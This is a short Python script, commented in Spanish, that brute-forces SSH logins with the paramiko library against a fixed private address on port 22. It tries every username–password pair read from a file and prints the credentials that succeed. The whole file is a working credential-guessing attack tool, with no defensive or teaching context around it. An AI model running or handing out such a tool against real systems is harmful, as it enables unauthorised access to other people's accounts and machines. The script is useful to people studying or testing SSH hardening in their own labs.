#/usr/bin/env python
#_*_ coding: utf-8 _*_

import paramiko
import time 
def brute(host, puerto, usuario, password): 
	log= paramiko.util.log_to_file('log.log')
	cliente = paramiko.SSHClient()
	cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try: 
		cliente.connect(host, port=puerto, username=usuario, password = password)
		print("Credenciales {} : {} ".format(usuario, password))
	except: 
		print("Fallo la autenticacion")

def main(): 
		ip = '192.168.8.6'
		puerto = 22
		usuarios = open('users_password.txt','r')
		usuarios = usuarios.read().split('\n')
		passwords = open('users_password.txt','r')
		passwords = passwords.read().split('\n')

		for user in usuarios: 
			for p in passwords: 
				time.sleep(3)
				brute(ip, puerto, user, p)

if __name__ == '__main__':
	try: 
		main() 
	except KeyboardInterrupt: 
		exit() 
		